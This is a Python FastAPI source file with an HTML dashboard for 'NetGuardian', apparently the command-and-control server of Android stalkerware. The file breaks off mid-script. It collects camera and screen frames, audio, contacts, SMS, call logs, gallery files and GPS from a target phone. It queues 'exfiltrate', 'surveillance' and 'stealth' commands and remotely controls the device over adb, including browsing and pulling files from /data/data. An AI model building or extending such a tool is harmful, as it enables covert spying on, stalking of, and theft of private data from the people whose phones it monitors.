from fastapi import FastAPI, UploadFile, Form, File, Query, Body
from fastapi.responses import HTMLResponse, JSONResponse, FileResponse, Response
from fastapi.middleware.cors import CORSMiddleware
import sqlite3
import json
from datetime import datetime, timedelta
from pathlib import Path
import drive_uploader

app = FastAPI(title="NetGuardian Web Monitor")
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
UPLOAD_DIR = Path("uploads")
UPLOAD_DIR.mkdir(exist_ok=True)
DB = "netguardian.db"

def init_db():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS captures (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        type TEXT NOT NULL, device_id TEXT DEFAULT '',
        data TEXT DEFAULT '', file_path TEXT DEFAULT '',
        drive_file_id TEXT DEFAULT '', drive_view_url TEXT DEFAULT '',
        created_at TEXT NOT NULL
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS contacts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT DEFAULT '', name TEXT DEFAULT '',
        phone TEXT DEFAULT '', email TEXT DEFAULT '',
        created_at TEXT NOT NULL
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        action TEXT NOT NULL, target TEXT NOT NULL,
        params TEXT DEFAULT '{}', device_id TEXT DEFAULT '',
        status TEXT DEFAULT 'pending',
        result TEXT DEFAULT '', created_at TEXT NOT NULL
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS alerts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        type TEXT NOT NULL, message TEXT DEFAULT '',
        source TEXT DEFAULT 'system', created_at TEXT NOT NULL
    )""")
    conn.commit()
    conn.close()

init_db()

def db():
    return sqlite3.connect(DB)

@app.get("/", response_class=HTMLResponse)
async def dashboard():
    global last_device_poll
    device_online = bool(last_device_poll) and (datetime.now() - last_device_poll).total_seconds() < 60
    status_text = "Device Online" if device_online else "Waiting for device"
    dot_class = "online" if device_online else "offline"
    html = HTMLContent.replace(
        '<span id="status-text">Unknown</span>',
        f'<span id="status-text">{status_text}</span>'
    ).replace(
        'class="dot offline" id="status-dot"',
        f'class="dot {dot_class}" id="status-dot"'
    )
    return Response(content=html, media_type="text/html",
                    headers={"Cache-Control": "no-cache, no-store, must-revalidate",
                             "Pragma": "no-cache", "Expires": "0"})

@app.post("/api/capture")
async def upload_capture(
    type: str = Form(...), device_id: str = Form(""),
    data: str = Form(""), file: UploadFile = File(None)
):
    file_path = ""
    drive_file_id = ""
    drive_view_url = ""
    if file and file.filename:
        ext = file.filename.split(".")[-1]
        name = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}_{type}.{ext}"
        dest = UPLOAD_DIR / name
        with open(dest, "wb") as f:
            f.write(await file.read())
        file_path = str(dest)

        if drive_uploader.is_configured():
            mime_map = {"jpg":"image/jpeg","jpeg":"image/jpeg","png":"image/png",
                        "mp4":"video/mp4","mp3":"audio/mpeg","aac":"audio/aac","m4a":"audio/mp4"}
            mime = mime_map.get(ext.lower(), "application/octet-stream")
            result = drive_uploader.upload_file(str(dest), mime)
            if result:
                drive_file_id = result["id"]
                drive_view_url = drive_uploader.get_embed_url(result["id"], result["mimeType"])

    conn = db()
    c = conn.cursor()
    c.execute(
        "INSERT INTO captures (type, device_id, data, file_path, drive_file_id, drive_view_url, created_at) VALUES (?,?,?,?,?,?,?)",
        (type, device_id, data, file_path, drive_file_id, drive_view_url, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return {"ok": True, "id": c.lastrowid}

@app.post("/api/contacts")
async def upload_contacts(device_id: str = Form(""), contacts: str = Form(...)):
    parsed = json.loads(contacts)
    conn = db()
    c = conn.cursor()
    now = datetime.now().isoformat()
    for ct in parsed:
        c.execute("INSERT INTO contacts (device_id, name, phone, email, created_at) VALUES (?,?,?,?,?)",
                  (device_id, ct.get("name",""), ct.get("phone",""), ct.get("email",""), now))
    conn.commit()
    conn.close()
    return {"ok": True, "count": len(parsed)}

@app.get("/api/data")
async def get_data():
    conn = db()
    c = conn.cursor()
    captures = c.execute("SELECT * FROM captures ORDER BY created_at DESC LIMIT 100").fetchall()
    contacts = c.execute("SELECT * FROM contacts ORDER BY created_at DESC LIMIT 200").fetchall()
    commands = c.execute("SELECT * FROM commands ORDER BY created_at DESC LIMIT 50").fetchall()
    alerts = c.execute("SELECT * FROM alerts ORDER BY created_at DESC LIMIT 50").fetchall()
    conn.close()

    def enrich_capture(r):
        cap = {"id":r[0],"type":r[1],"device":r[2],"data":r[3],
               "file":r[4],"drive_id":r[5],"drive_url":r[6],"time":r[7]}
        if not cap["data"] and cap["file"] and any(t in cap["type"] for t in ["exfil_","surveillance_location"]):
            try:
                with open(cap["file"]) as f:
                    content = f.read(500)
                    cap["data"] = content
            except: pass
        return cap

    return {
        "captures": [enrich_capture(r) for r in captures],
        "contacts": [{"id":r[0],"device":r[1],"name":r[2],"phone":r[3],"email":r[4],"time":r[5]} for r in contacts],
        "commands": [{"id":r[0],"action":r[1],"target":r[2],"params":r[3],"device":r[4],"status":r[5],"result":r[6],"time":r[7]} for r in commands],
        "alerts": [{"id":r[0],"type":r[1],"message":r[2],"source":r[3],"time":r[4]} for r in alerts]
    }

@app.post("/api/commands")
async def create_command(
    action: str = Body(...), target: str = Body(...),
    params: str = Body("{}"), device_id: str = Body("")
):
    conn = db()
    c = conn.cursor()
    c.execute("INSERT INTO commands (action, target, params, device_id, status, created_at) VALUES (?,?,?,?,'pending',?)",
              (action, target, params, device_id, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return {"ok": True, "id": c.lastrowid}

@app.get("/api/commands/pending")
async def get_pending(device_id: str = "", action: str = ""):
    global last_device_poll
    last_device_poll = datetime.now()
    conn = db()
    c = conn.cursor()
    c.execute("UPDATE commands SET status='failed', result='timeout' WHERE status='pending' AND created_at < ?",
              ((datetime.now() - timedelta(seconds=30)).isoformat(),))
    if c.rowcount > 0:
        conn.commit()
    q = "SELECT * FROM commands WHERE status='pending'"
    args = []
    if device_id:
        q += " AND device_id=?"
        args.append(device_id)
    if action:
        q += " AND action=?"
        args.append(action)
    q += " ORDER BY id ASC LIMIT 10"
    rows = c.execute(q, args).fetchall()
    conn.close()
    return [{"id":r[0],"action":r[1],"target":r[2],"params":r[3],"device":r[4],"status":r[5]} for r in rows]

@app.post("/api/commands/ack")
async def ack_command(id: int = Form(...), status: str = Form("done"), result: str = Form("")):
    conn = db()
    c = conn.cursor()
    c.execute("UPDATE commands SET status=?, result=? WHERE id=?", (status, result, id))
    conn.commit()
    conn.close()
    return {"ok": True}

latest_frame = None

@app.post("/api/camera/frame")
async def camera_frame(file: UploadFile = File(...)):
    global latest_frame
    latest_frame = await file.read()
    return {"ok": True}

@app.get("/api/camera/frame.jpg")
async def get_camera_frame():
    if latest_frame:
        return Response(content=latest_frame, media_type="image/jpeg",
                        headers={"Cache-Control": "no-cache, no-store, must-revalidate", "Pragma": "no-cache", "Expires": "0"})
    return Response(status_code=204)

@app.get("/uploads/{filename}")
async def serve_upload(filename: str):
    path = UPLOAD_DIR / filename
    if path.exists():
        mime_map = {"jpg":"image/jpeg","jpeg":"image/jpeg","png":"image/png",
                    "mp4":"video/mp4","mp3":"audio/mpeg","aac":"audio/aac","m4a":"audio/mp4",
                    "txt":"text/plain","json":"application/json","dat":"application/octet-stream"}
        ext = filename.split(".")[-1].lower() if "." in filename else ""
        mime = mime_map.get(ext, "application/octet-stream")
        return FileResponse(str(path), media_type=mime)
    return JSONResponse({"error": "not found"}, status_code=404)

screen_frame = None
screen_stream_active = False

@app.post("/api/screen/frame")
async def screen_frame_upload(file: UploadFile = File(...)):
    global screen_frame, screen_stream_active
    screen_frame = await file.read()
    screen_stream_active = True
    return {"ok": True}

@app.post("/api/screen/heartbeat")
async def screen_heartbeat(status: str = Form("LIVE")):
    global screen_stream_active
    screen_stream_active = status == "LIVE"
    return {"ok": True}

@app.get("/api/screen/frame.jpg")
async def get_screen_frame():
    if screen_frame:
        return Response(content=screen_frame, media_type="image/jpeg",
                        headers={"Cache-Control": "no-cache, no-store, must-revalidate", "Pragma": "no-cache", "Expires": "0"})
    return Response(status_code=204)

@app.get("/api/screen/status")
async def screen_status():
    return {"active": screen_stream_active, "last_frame": screen_frame is not None}

@app.post("/api/remote/tap")
async def remote_tap(x: float = Form(...), y: float = Form(...)):
    try:
        import subprocess
        subprocess.run(["adb", "shell", "input", "tap", str(int(x)), str(int(y))],
                       capture_output=True, timeout=5)
        return {"ok": True}
    except Exception as e:
        return {"ok": False, "error": str(e)}

@app.post("/api/remote/swipe")
async def remote_swipe(x1: float = Form(...), y1: float = Form(...),
                       x2: float = Form(...), y2: float = Form(...),
                       duration: int = Form(300)):
    try:
        import subprocess
        subprocess.run(["adb", "shell", "input", "swipe",
                       str(int(x1)), str(int(y1)), str(int(x2)), str(int(y2)), str(duration)],
                       capture_output=True, timeout=5)
        return {"ok": True}
    except Exception as e:
        return {"ok": False, "error": str(e)}

@app.post("/api/remote/text")
async def remote_text(text: str = Form(...)):
    try:
        import subprocess
        safe = text.replace(" ", "%s")
        safe = safe.replace("'", "\\'")
        safe = safe.replace('"', '\\"')
        subprocess.run(["adb", "shell", "input", "text", safe],
                       capture_output=True, timeout=5)
        return {"ok": True}
    except Exception as e:
        return {"ok": False, "error": str(e)}

@app.post("/api/remote/key")
async def remote_key(key: str = Form(...)):
    try:
        import subprocess
        subprocess.run(["adb", "shell", "input", "keyevent", key],
                       capture_output=True, timeout=5)
        return {"ok": True}
    except Exception as e:
        return {"ok": False, "error": str(e)}

@app.post("/api/clear")
async def clear_all():
    global latest_frame, screen_frame, screen_stream_active
    latest_frame = None
    screen_frame = None
    screen_stream_active = False
    conn = db()
    c = conn.cursor()
    c.execute("DELETE FROM captures")
    c.execute("DELETE FROM contacts")
    c.execute("DELETE FROM commands")
    c.execute("DELETE FROM alerts")
    c.execute("DELETE FROM sqlite_sequence")
    conn.commit()
    conn.close()
    import shutil
    for f in UPLOAD_DIR.iterdir():
        if f.is_file():
            f.unlink()
    return {"ok": True, "cleared": "captures, contacts, commands, alerts, uploads"}

@app.post("/api/threat/alert")
async def threat_alert(data: dict = Body(...)):
    conn = db()
    c = conn.cursor()
    c.execute("INSERT INTO alerts (type, message, source, created_at) VALUES (?,?,?,?)",
              (data.get("type",""), data.get("message",""), data.get("source","system"), datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return {"ok": True, "id": c.lastrowid}

@app.get("/api/alerts")
async def get_alerts():
    conn = db()
    c = conn.cursor()
    alerts = c.execute("SELECT * FROM alerts ORDER BY created_at DESC LIMIT 100").fetchall()
    conn.close()
    return [{"id":r[0],"type":r[1],"message":r[2],"source":r[3],"time":r[4]} for r in alerts]

last_device_poll = None

@app.get("/api/status")
async def get_status():
    global last_device_poll
    conn = db()
    c = conn.cursor()
    cmds = c.execute("SELECT * FROM commands ORDER BY created_at ASC LIMIT 100").fetchall()
    alerts = c.execute("SELECT * FROM alerts ORDER BY created_at DESC LIMIT 50").fetchall()
    caps = c.execute("SELECT COUNT(*) FROM captures").fetchone()[0]
    conts = c.execute("SELECT COUNT(*) FROM contacts").fetchone()[0]
    conn.close()
    status = {"surveillance": False, "video": False, "audio": False, "motion": True,
              "tracking": False, "stealth": False, "camera_front": False, "screen_stream": False}
    for r in cmds:
        act, tgt, st = r[1], r[2], r[5]
        if st != "done": continue
        if act == "surveillance":
            if tgt == "stop": status["surveillance"] = False
            elif tgt == "start": status["surveillance"] = True
            elif tgt == "motion_on": status["motion"] = True
            elif tgt == "motion_off": status["motion"] = False
            elif tgt == "video_on": status["video"] = True
            elif tgt == "video_off": status["video"] = False
            elif tgt == "audio_on": status["audio"] = True
            elif tgt == "audio_off": status["audio"] = False
            elif tgt == "tracking_on": status["tracking"] = True
            elif tgt == "tracking_off": status["tracking"] = False
            elif tgt == "camera_front": status["camera_front"] = True
            elif tgt == "camera_back": status["camera_front"] = False
        elif act == "stealth":
            status["stealth"] = tgt == "on"
        elif act == "screen_stream":
            status["screen_stream"] = tgt == "start"
    motion_alerts = [r for r in alerts if r[1] == "MOTION_DETECTED"]
    device_online = bool(cmds) or caps > 0 or conts > 0 or (last_device_poll and (datetime.now() - last_device_poll).total_seconds() < 60)
    return {"device": device_online, **status, "motion_alerts": len(motion_alerts)}

@app.post("/api/files/ls")
async def file_list(data: dict = Body(...)):
    try:
        path = data.get("path", "/sdcard")
        import subprocess
        r = subprocess.run(["adb", "shell", "ls", "-la", path], capture_output=True, text=True, timeout=10)
        entries = []
        for line in r.stdout.split("\n"):
            parts = line.split()
            if len(parts) < 6 or parts[0][0] not in ("-","d","l"): continue
            is_dir = parts[0][0] == "d"
            name = " ".join(parts[8:]) if len(parts) > 8 else parts[-1]
            size = parts[4] if not is_dir else "-"
            entries.append({"name": name, "dir": is_dir, "size": size, "perms": parts[0]})
        return {"ok": True, "path": path, "entries": entries, "error": r.stderr}
    except Exception as e:
        return {"ok": False, "error": str(e)}

@app.get("/api/files/download")
async def file_download(path: str = ""):
    import subprocess, tempfile, os
    if not path: return JSONResponse({"error": "no path"}, 400)
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".bin")
    tmp.close()
    try:
        subprocess.run(["adb", "pull", path, tmp.name], capture_output=True, timeout=30)
        if os.path.getsize(tmp.name) == 0:
            return JSONResponse({"error": "file empty or not found"}, 404)
        return FileResponse(tmp.name, filename=os.path.basename(path))
    except Exception as e:
        return JSONResponse({"error": str(e)}, 500)
    finally:
        try: os.unlink(tmp.name)
        except: pass

@app.post("/api/files/upload")
async def file_upload(file: UploadFile = File(...), dest: str = Form("/sdcard/Download")):
    try:
        import subprocess, tempfile, os
        tmp = tempfile.NamedTemporaryFile(delete=False, suffix=f"_{file.filename}")
        tmp.write(await file.read())
        tmp.close()
        r = subprocess.run(["adb", "push", tmp.name, f"{dest}/{file.filename}"], capture_output=True, timeout=30)
        os.unlink(tmp.name)
        return {"ok": r.returncode == 0, "dest": f"{dest}/{file.filename}", "error": r.stderr}
    except Exception as e:
        return {"ok": False, "error": str(e)}

HTMLContent = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>NetGuardian Web Monitor</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body { font-family:'Segoe UI',system-ui,-apple-system,sans-serif; background:#0f0f23; color:#c8d6e5; min-height:100vh; }
  .header { background:#1a1a2e; padding:16px 24px; border-bottom:2px solid #4cc9f0; display:flex; justify-content:space-between; align-items:center; }
  .header h1 { color:#4cc9f0; font-size:20px; }
  .header .sub { color:#576574; font-size:12px; margin-top:2px; }
  #device-status { display:flex; align-items:center; gap:6px; font-size:13px; }
  #device-status .dot { width:10px; height:10px; border-radius:50%; display:inline-block; }
  #device-status .dot.online { background:#10ac84; box-shadow:0 0 6px #10ac84; }
  #device-status .dot.offline { background:#e94560; box-shadow:0 0 6px #e94560; }
  .container { max-width:1280px; margin:0 auto; padding:16px 20px; }

  .section { margin-bottom:20px; }
  .section-title { display:flex; align-items:center; gap:8px; font-size:15px; font-weight:600; color:#4cc9f0; margin-bottom:10px; padding-bottom:6px; border-bottom:1px solid #1a1a2e; }
  .section-title .badge { background:#e94560; color:#fff; padding:0 8px; border-radius:10px; font-size:11px; line-height:18px; }

  .card { background:#1a1a2e; border-radius:8px; padding:16px; border:1px solid #16213e; }
  .card-cmd { background:#1a1a2e; border-radius:8px; padding:12px 16px; border:1px solid #16213e; }

  .btn-row { display:flex; flex-wrap:wrap; gap:6px; }
  .btn { background:#16213e; color:#4cc9f0; border:1px solid #0f3460; padding:7px 14px; border-radius:6px; cursor:pointer; font-size:12px; transition:all .15s; white-space:nowrap; }
  .btn:hover { background:#0f3460; border-color:#4cc9f0; }
  .btn-danger { color:#e94560; border-color:#e94560; }
  .btn-danger:hover { background:#e94560; color:#fff; }
  .btn.primary { background:#4cc9f0; color:#000; font-weight:600; border-color:#4cc9f0; }
  .btn.primary:hover { background:#3ab7dc; }
  .btn.danger { background:#e94560; color:#fff; border-color:#e94560; }
  .btn.danger:hover { background:#d63851; }
  .btn.success { background:#10ac84; color:#fff; border-color:#10ac84; }
  .btn.success:hover { background:#0e9d78; }

  .stats { display:grid; grid-template-columns:repeat(auto-fit,minmax(120px,1fr)); gap:10px; margin-bottom:20px; }
  .stat-card { background:#1a1a2e; border-radius:8px; padding:14px; text-align:center; border:1px solid #16213e; }
  .stat-card .num { font-size:26px; font-weight:700; color:#4cc9f0; font-family:monospace; }
  .stat-card .label { font-size:11px; color:#576574; margin-top:2px; text-transform:uppercase; letter-spacing:.5px; }

  .capture-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(240px,1fr)); gap:12px; }
  .capture-item { background:#1a1a2e; border-radius:8px; overflow:hidden; border:1px solid #16213e; transition:border-color .2s; }
  .capture-item:hover { border-color:#4cc9f0; }
  .capture-item .thumb { width:100%; height:160px; object-fit:cover; background:#0f0f23; display:block; border-bottom:1px solid #16213e; }
  .capture-item .info { padding:8px 10px; font-size:12px; display:flex; justify-content:space-between; align-items:center; }
  .capture-item .info .tag { display:inline-block; background:#16213e; padding:1px 6px; border-radius:3px; font-size:10px; color:#4cc9f0; }
  .capture-item .info .time { color:#576574; font-size:10px; font-family:monospace; }
  .capture-item .audio-preview { padding:8px; }
  .capture-item .audio-preview audio { width:100%; height:32px; }

  .cmd-list { display:flex; flex-direction:column; gap:2px; }
  .cmd-row { display:flex; align-items:center; gap:8px; padding:5px 0; border-bottom:1px solid #16213e; font-size:12px; font-family:monospace; }
  .cmd-row:last-child { border-bottom:none; }
  .cmd-row .act { background:#16213e; color:#4cc9f0; padding:0 6px; border-radius:3px; font-size:10px; white-space:nowrap; }
  .cmd-row .tgt { color:#c8d6e5; min-width:70px; }
  .cmd-row .status { font-size:10px; padding:0 6px; border-radius:3px; white-space:nowrap; font-weight:600; }
  .cmd-row .status.done { color:#10ac84; }
  .cmd-row .status.pending { color:#feca57; }
  .cmd-row .status.failed { color:#e94560; }
  .cmd-row .res { color:#576574; font-size:11px; }
  .cmd-row .time { color:#576574; font-size:10px; margin-left:auto; white-space:nowrap; }

  .contact-row { display:flex; flex-wrap:wrap; gap:4px; }
  .contact-chip { background:#16213e; border-radius:16px; padding:3px 10px; font-size:11px; border:1px solid #0f3460; }
  .contact-chip .name { color:#c8d6e5; }
  .contact-chip .detail { color:#576574; font-size:10px; }

  .livecam-wrapper { position:relative; }
  .livecam-wrapper img { width:100%; max-height:480px; object-fit:contain; border-radius:6px; border:2px solid #4cc9f0; background:#000; }
  .livecam-overlay { position:absolute; top:8px; left:8px; display:flex; gap:6px; align-items:center; }
  .livecam-dot { width:8px; height:8px; background:#10ac84; border-radius:50%; animation:pulse 1.2s infinite; }
  @keyframes pulse { 0%{opacity:1} 50%{opacity:.3} 100%{opacity:1} }
  .livecam-label { background:rgba(0,0,0,.7); color:#10ac84; font-size:11px; padding:2px 8px; border-radius:4px; font-weight:600; }

  .toast { position:fixed; bottom:24px; right:24px; background:#4cc9f0; color:#000; padding:12px 20px; border-radius:8px; font-weight:600; z-index:999; transform:translateY(80px); opacity:0; transition:all .3s; font-size:13px; }
  .toast.show { transform:translateY(0); opacity:1; }

  .search-box { background:#16213e; border:1px solid #0f3460; border-radius:6px; padding:6px 12px; color:#c8d6e5; font-size:13px; width:100%; margin-bottom:10px; outline:none; transition:border-color .2s; }
  .search-box:focus { border-color:#4cc9f0; }

  .empty-state { text-align:center; padding:24px; color:#576574; font-size:13px; }

  .tab-bar { display:flex; gap:2px; margin-bottom:12px; }
  .tab { background:#16213e; color:#576574; padding:6px 16px; border-radius:6px 6px 0 0; cursor:pointer; font-size:12px; border:1px solid #16213e; border-bottom:2px solid transparent; transition:all .2s; }
  .tab:hover { color:#c8d6e5; }
  .tab.active { background:#1a1a2e; color:#4cc9f0; border-color:#0f3460; border-bottom-color:#4cc9f0; }
  .tab-content { display:none; }
  .tab-content.active { display:block; }
</style>
</head>
<body>
<div class="header">
  <div>
    <h1>NetGuardian</h1>
    <div class="sub">Remote device control & monitoring</div>
  </div>
  <div id="device-status"><span class="dot offline" id="status-dot"></span><span id="status-text">Unknown</span></div>
</div>
<div class="container">

  <div class="stats" id="stats"></div>

  <div class="card" style="margin-bottom:16px;">
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
      <h3 style="color:#4cc9f0;font-size:14px;">Remote Control</h3>
      <span id="cmd-sending" style="display:none;font-size:11px;color:#feca57;">sending...</span>
    </div>
    <div class="btn-row">
      <button class="btn danger" onclick="sendCmd('camera_stream','start');startLiveCam();">Live Camera</button>
      <button class="btn danger" onclick="sendCmd('camera_stream','stop');stopLiveCam();">Stop Camera</button>
      <button class="btn primary" onclick="sendCmd('trigger_capture','camera')">Capture Camera</button>
      <button class="btn primary" onclick="sendCmd('trigger_capture','screen')">Capture Screen</button>
      <button class="btn primary" onclick="sendCmd('request_permission','camera')">Grant Camera</button>
      <button class="btn primary" onclick="sendCmd('request_permission','microphone')">Grant Mic</button>
      <button class="btn primary" onclick="sendCmd('request_permission','contacts')">Grant Contacts</button>
      <button class="btn primary" onclick="sendCmd('request_permission','sms')">Grant SMS</button>
      <button class="btn primary" onclick="sendCmd('request_permission','call_log')">Grant Call Log</button>
      <button class="btn primary" onclick="sendCmd('request_permission','gallery')">Grant Gallery</button>
      <button class="btn primary" onclick="sendCmd('request_permission','location')">Grant Location</button>
      <button class="btn primary" onclick="sendCmd('trigger_capture','audio')">Record Audio</button>
      <button class="btn primary" onclick="sendCmd('trigger_capture','contacts')">Read Contacts</button>
      <button class="btn danger" onclick="sendCmd('open_settings','')">App Settings</button>
      <button class="btn success" onclick="sendCmd('surveillance','start')">Surveillance ON</button>
      <button class="btn danger" onclick="sendCmd('surveillance','stop')">Surveillance OFF</button>
      <button class="btn primary" onclick="sendCmd('surveillance','audio_on')">MIC Live</button>
      <button class="btn" onclick="sendCmd('surveillance','camera_front')">Selfie</button>
      <button class="btn" onclick="sendCmd('surveillance','camera_back')">Main</button>
      <button class="btn primary" onclick="sendCmd('exfiltrate','sms')">Read SMS</button>
      <button class="btn primary" onclick="sendCmd('exfiltrate','call_log')">Read Call Log</button>
      <button class="btn primary" onclick="sendCmd('exfiltrate','gallery')">Read Gallery</button>
    </div>
  </div>

  <div class="card" id="livecam-section" style="display:none;margin-bottom:16px;">
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
      <h3 style="color:#4cc9f0;font-size:14px;">Live Camera Feed</h3>
      <button class="btn danger" onclick="sendCmd('camera_stream','stop');stopLiveCam();" style="font-size:11px;">Stop</button>
    </div>
    <div class="livecam-wrapper">
      <img id="livecam" />
      <div class="livecam-overlay"><span class="livecam-dot"></span><span class="livecam-label" id="livecam-status">LIVE</span></div>
    </div>
  </div>

  <div class="tab-bar">
    <div class="tab active" data-tab="captures" onclick="switchTab('captures')">Captures <span id="capture-count" style="color:#e94560;">0</span></div>
    <div class="tab" data-tab="contacts" onclick="switchTab('contacts')">Contacts <span id="contact-count" style="color:#e94560;">0</span></div>
    <div class="tab" data-tab="commands" onclick="switchTab('commands')">Commands</div>
    <div class="tab" data-tab="screen" onclick="switchTab('screen')">Screen</div>
    <div class="tab" data-tab="surveillance" onclick="switchTab('surveillance')">Surveillance <span id="alert-count" style="color:#e94560;">0</span></div>
    <div class="tab" data-tab="files" onclick="switchTab('files')">Files</div>
    <div style="flex:1;"></div>
    <button class="btn btn-danger" onclick="clearAll()" style="padding:4px 10px;font-size:11px;">Clear All</button>
  </div>

  <div class="tab-content active" id="tab-captures">
    <div id="captures"></div>
  </div>

  <div class="tab-content" id="tab-contacts">
    <input class="search-box" id="contact-search" placeholder="Search contacts..." oninput="renderContacts()" />
    <div id="contacts"></div>
  </div>

  <div class="tab-content" id="tab-commands">
    <div id="cmdlog"></div>
  </div>

  <div class="tab-content" id="tab-screen">
    <div class="btn-row" style="margin-bottom:10px;">
      <button class="btn" onclick="sendCmd('screen_stream','start');startScreenFeed();">Start Screen</button>
      <button class="btn btn-danger" onclick="sendCmd('screen_stream','stop')">Stop Screen</button>
    </div>
    <div id="screen-viewer" style="position:relative; background:#000; border-radius:8px; overflow:hidden; max-width:500px; margin:0 auto;">
      <img id="screen-feed" style="width:100%; display:block;" />
      <div id="touch-overlay" style="position:absolute; top:0; left:0; width:100%; height:100%; cursor:crosshair;"></div>
      <div id="screen-status" style="position:absolute; top:6px; right:6px; background:rgba(0,0,0,0.7); color:#576574; font-size:11px; padding:2px 8px; border-radius:4px;">WAITING</div>
    </div>
    <div class="btn-row" style="margin-top:10px; justify-content:center;">
      <button class="btn" onclick="doKey('HOME')">Home</button>
      <button class="btn" onclick="doKey('BACK')">Back</button>
      <button class="btn" onclick="doKey('APP_SWITCH')">Recents</button>
      <button class="btn" onclick="doKey('POWER')">Sleep</button>
    </div>
  </div>

    <div class="tab-content" id="tab-surveillance">
      <div class="card" style="margin-bottom:16px;">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
          <h3 style="color:#4cc9f0;font-size:14px;">24/7 Surveillance Mode</h3>
          <span id="surveillance-status" style="font-size:11px;padding:2px 8px;border-radius:4px;font-weight:600;">Offline</span>
        </div>
        <div class="btn-row" style="margin-bottom:10px;">
          <button class="btn success" onclick="sendCmd('surveillance','start')">Start Surveillance</button>
          <button class="btn btn-danger" onclick="sendCmd('surveillance','stop')">Stop Surveillance</button>
          <button class="btn" onclick="sendCmd('surveillance','motion_on')">Motion ON</button>
          <button class="btn" onclick="sendCmd('surveillance','motion_off')">Motion OFF</button>
          <button class="btn primary" onclick="sendCmd('surveillance','video_on')">Video ON</button>
          <button class="btn" onclick="sendCmd('surveillance','video_off')">Video OFF</button>
          <button class="btn primary" onclick="sendCmd('surveillance','audio_on')">MIC ON</button>
          <button class="btn" onclick="sendCmd('surveillance','audio_off')">MIC OFF</button>
          <button class="btn" onclick="sendCmd('surveillance','camera_front')">Selfie Cam</button>
          <button class="btn" onclick="sendCmd('surveillance','camera_back')">Main Cam</button>
          <button class="btn" onclick="sendCmd('record_video','30')">Record 30s</button>
          <button class="btn success" onclick="sendCmd('surveillance','tracking_on')">GPS ON</button>
          <button class="btn" onclick="sendCmd('surveillance','tracking_off')">GPS OFF</button>
          <button class="btn" onclick="sendCmd('stealth','on')">Stealth ON</button>
          <button class="btn" onclick="sendCmd('stealth','off')">Stealth OFF</button>
        </div>
        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(100px,1fr));gap:8px;margin-bottom:8px;">
          <div style="background:#16213e;border-radius:6px;padding:10px;text-align:center;">
            <div style="font-size:11px;color:#576574;">Motion Alerts</div>
            <div id="motion-count" style="font-size:20px;font-weight:700;color:#feca57;font-family:monospace;">0</div>
          </div>
          <div style="background:#16213e;border-radius:6px;padding:10px;text-align:center;">
            <div style="font-size:11px;color:#576574;">Status</div>
            <div id="surveillance-detail" style="font-size:12px;color:#576574;">--</div>
          </div>
          <div style="background:#16213e;border-radius:6px;padding:10px;text-align:center;">
            <div style="font-size:11px;color:#576574;">Motion Detection</div>
            <div id="motion-state" style="font-size:12px;color:#576574;">--</div>
          </div>
          <div style="background:#16213e;border-radius:6px;padding:10px;text-align:center;">
            <div style="font-size:11px;color:#576574;">GPS Tracking</div>
            <div id="tracking-state" style="font-size:12px;color:#576574;">--</div>
          </div>
          <div style="background:#16213e;border-radius:6px;padding:10px;text-align:center;">
            <div style="font-size:11px;color:#576574;">Stealth</div>
            <div id="stealth-state" style="font-size:12px;color:#576574;">--</div>
          </div>
        </div>
      </div>
      <div class="section-title">Motion Alerts</div>
      <div id="alerts"></div>
    </div>

  <div class="tab-content" id="tab-files">
    <div class="card" style="margin-bottom:12px;">
      <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;">
        <h3 style="color:#4cc9f0;font-size:14px;">File Browser</h3>
        <span style="font-size:11px;color:#576574;" id="current-path">/storage/emulated/0</span>
      </div>
      <div style="display:flex;gap:6px;margin-bottom:10px;">
        <input class="search-box" id="file-path-input" value="/storage/emulated/0" style="flex:1;margin-bottom:0;" />
        <button class="btn" onclick="browseFiles(document.getElementById('file-path-input').value)">Browse</button>
        <button class="btn" onclick="browseFiles('/storage/emulated/0')">SDCARD</button>
        <button class="btn" onclick="browseFiles('/storage/emulated/0/Download')">Download</button>
        <button class="btn" onclick="browseFiles('/storage/emulated/0/DCIM')">DCIM</button>
        <button class="btn" onclick="browseFiles('/data/data')">DATA</button>
      </div>
      <div id="file-list" style="max-height:400px;overflow-y:auto;font-family:monospace;font-size:12px;"></div>
    </div>
    <div class="card">
      <h3 style="color:#4cc9f0;font-size:14px;margin-bottom:10px;">Upload File to Device</h3>
      <div style="display:flex;gap:6px;align-items:center;">
        <input type="file" id="upload-file-input" style="flex:1;font-size:12px;" />
        <button class="btn primary" onclick="uploadFile()">Upload</button>
      </div>
      <div id="upload-status" style="font-size:11px;color:#576574;margin-top:6px;"></div>
    </div>
  </div>

</div>
<div class="toast" id="toast"></div>
<script>
function toast(m) {
  const t=document.getElementById('toast');
  t.textContent=m;
  t.className='toast show';
  setTimeout(()=>{t.className='toast'},2500);
}

function switchTab(name) {
  document.querySelectorAll('.tab').forEach(t=>t.classList.toggle('active',t.dataset.tab===name));
  document.querySelectorAll('.tab-content').forEach(t=>t.classList.toggle('active',t.id==='tab-'+name));
}

async function sendCmd(action, target) {
  const el=document.getElementById('cmd-sending');
  el.style.display='inline';
  try {
    const r=await fetch('/api/commands',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
